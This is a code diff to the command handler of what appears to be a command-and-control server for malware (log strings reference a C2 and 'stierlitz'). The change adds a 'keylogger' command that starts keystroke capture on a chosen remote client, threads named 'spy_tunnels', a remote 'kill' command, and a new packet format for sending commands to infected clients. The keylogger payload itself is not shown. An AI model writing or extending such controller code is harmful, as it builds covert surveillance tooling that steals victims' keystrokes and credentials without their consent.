@@ -106,6 +106,21 @@ CommandHandler::CommandHandler(
         this,
         {HELP_ARG}
     ));
+    command_map_.emplace("keylogger", Command(
+        "Start listening the key logs of the selected client. Usage: keylogger -i <client_index>",
+        &CommandHandler::keylogger,
+        this,
+        {HELP_ARG},
+        {INDEX_ARG}
+    ));
+}
+
+CommandHandler::~CommandHandler() {
+    for (auto& thread:spy_tunnels_) {
+        if (thread.joinable()) {
+            thread.join();
+        }
+    }
 }
 
 bool CommandHandler::command_exists(const std::string& __root_cmd) {
@@ -235,37 +250,37 @@ int CommandHandler::parse_command(const std::string& __root_cmd) {
 
     return 0;
 }
-void CommandHandler::send_client(uint8_t __command, int __client_index) {
+
+void CommandHandler::send_packet(uint16_t __packet, int __client_index) {
+    int rc = send(p_clients_->at(__client_index)->socket(), &__packet, sizeof(__packet),0);
+    if (rc < 0) {
+        *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::send_client] Error sending command to client " << __client_index << ": " << rc << RESET;
+    } else if (rc == PEER_DISCONNECTED_ERROR) {
+        *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::send_client] Client " << __client_index << " disconnected" << RESET;
+    } else {
+        *p_event_log_ << LOG_DEBUG << GREEN << "[CommandHandler::send_client] Command sent to client " << __client_index << RESET;
+    }
+}
+
+void CommandHandler::send_client(CommandCode __command, uint8_t __port, int __client_index) {
     if (__client_index < 0 || __client_index >= p_clients_->size()) {
         *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::send_client] Invalid client index: " << __client_index << RESET;
         return;
     }
 
     if (p_clients_->at(__client_index) != nullptr && ClientHandler::is_client_up(p_clients_->at(__client_index)->socket()) == 0) {
-        int rc = send_command(p_clients_->at(__client_index)->socket(), __command);
-        if (rc < 0) {
-            *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::send_client] Error sending command to client " << __client_index << ": " << rc << RESET;
-        } else if (rc == PEER_DISCONNECTED_ERROR) {
-            *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::send_client] Client " << __client_index << " disconnected" << RESET;
-        } else {
-            *p_event_log_ << LOG_DEBUG << GREEN << "[CommandHandler::send_client] Command sent to client " << __client_index << RESET;
-        }
+        uint16_t packet = (__command << 8) | __port;
+        send_packet(packet, __client_index);
     } else {
         *p_event_log_ << LOG_DEBUG << YELLOW << "[CommandHandler::send_client] Client " << __client_index << " is not available" << RESET;
     }
 }
 
-void CommandHandler::send_client(uint8_t __command) {
+void CommandHandler::send_client(CommandCode __command) {
+    uint16_t packet = __command << 8;
     for (int i=0; i<p_clients_->size(); i++) {
         if (p_clients_->at(i) != nullptr && ClientHandler::is_client_up(p_clients_->at(i)->socket())) {
-            int rc = send_command(p_clients_->at(i)->socket(), __command);
-            if (rc < 0) {
-                *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::send_client] Error sending command to client " << i << ": " << rc << RESET;
-            } else if (rc == PEER_DISCONNECTED_ERROR) {
-                *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::send_client] Client " << i << " disconnected" << RESET;
-            } else {
-                *p_event_log_ << LOG_DEBUG << GREEN << "[CommandHandler::send_client] Command sent to client " << i << RESET;
-            }
+            send_packet(packet, i);
         }
     }
 }
@@ -279,10 +294,8 @@ void CommandHandler::help() {
 }
 
 void CommandHandler::test() {
-    *p_event_log_ << LOG_MUST << CYAN << "stierlitz Test command executed" << RESET_C2_FIFO;
-
     if(arg_map_.find(INDEX_ARG) != arg_map_.end()) {
-        send_client(TEST, std::any_cast<int>(arg_map_[INDEX_ARG]));
+        send_client(TEST, 0, std::any_cast<int>(arg_map_[INDEX_ARG]));
     }
     if(arg_map_.find(ALL_ARG) != arg_map_.end()) {
         send_client(TEST);
@@ -319,6 +332,15 @@ void CommandHandler::set_verbosity() {
     *p_user_verbosity_ = new_verbosity;
 }
 
+void CommandHandler::kill() {
+    if (arg_map_.find(INDEX_ARG) != arg_map_.end()) {
+        send_client(KILL, 0, std::any_cast<int>(arg_map_[INDEX_ARG]));
+    }
+    if (arg_map_.find(ALL_ARG) != arg_map_.end()) {
+        send_client(KILL);
+    }
+}
+
 void CommandHandler::execute_command(char* __cmd, int __len) {
     int rc = 0;
 
@@ -341,4 +363,14 @@ void CommandHandler::execute_command(char* __cmd, int __len) {
 void CommandHandler::cleanup() {
     cmd_.clear();
     arg_map_.clear();
+}
+
+void CommandHandler::cleanup_tunnels() {
+    spy_tunnels_.erase(
+        std::remove_if(
+            spy_tunnels_.begin(),
+            spy_tunnels_.end(),
+            [](std::thread& t) {return !t.joinable();}), 
+        spy_tunnels_.end()
+    );
 }
